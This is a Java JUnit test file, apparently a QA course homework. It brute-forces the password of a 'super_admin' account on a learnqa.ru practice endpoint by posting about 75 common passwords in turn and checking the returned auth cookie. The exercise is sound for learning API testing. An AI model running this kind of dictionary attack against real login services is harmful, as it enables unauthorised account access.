import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import io.restassured.response.ResponseBody;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;


public class FindPassword {

    @Test
    public void findPassword() {
        String login = "super_admin";
        Map<String, String> credentials = new HashMap<>();
        credentials.put("login", login);
        String [] password = {"123456","password","123456789", "12345678", "12345","qwerty",
                "abc123", "football", "1234567", "monkey", "111111", "letmein",
                "1234", "1234567890","dragon","baseball","sunshine","iloveyou",
                "trustno1","princess","adobe123","123123","welcome","login",
                "admin","abc123","qwerty123","solo","1q2w3e4r","master",
                "666666","photoshop","1qaz2wsx","qwertyuiop","ashley","mustang","121212",
                "starwars","654321","bailey","access","flower","555555","passw0rd","shadow",
                "lovely","7777777","michael","login","!@#$%^&*","jesus","password1","superman",
                "hello","charlie","888888","696969","hottie","freedom","aa123456","qazwsx",
                "ninja","azerty","solo","loveme","whatever","donald", "batman", "zaq1zaq1",
                "qazwsx","Football","000000","starwars", "123qwe"
        };
        int i = 0;
       // credentials.put("password", login);
        String cookie = "";
        String check ="You are authorized";
        String check1 ="";
        int checkCode = check.hashCode();
        int c=0;
        while (c!=checkCode) {
            credentials.put("password", password[i]);
            System.out.println(i+ ") Пароль - "+password[i]);
            i++;
            Response responseForCookie = RestAssured
                    .given()
                    .body(credentials)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            cookie = responseForCookie.getCookie("auth_cookie");
            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", cookie);
            Response responseForPasswordCheck = RestAssured
                    .given()
                    .cookies(cookies)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            check1 = responseForPasswordCheck.getBody().asString();
            c = check1.hashCode();
            if (c==checkCode) {
                System.out.println("Статус - " + check1);
            }
        }
    }
}

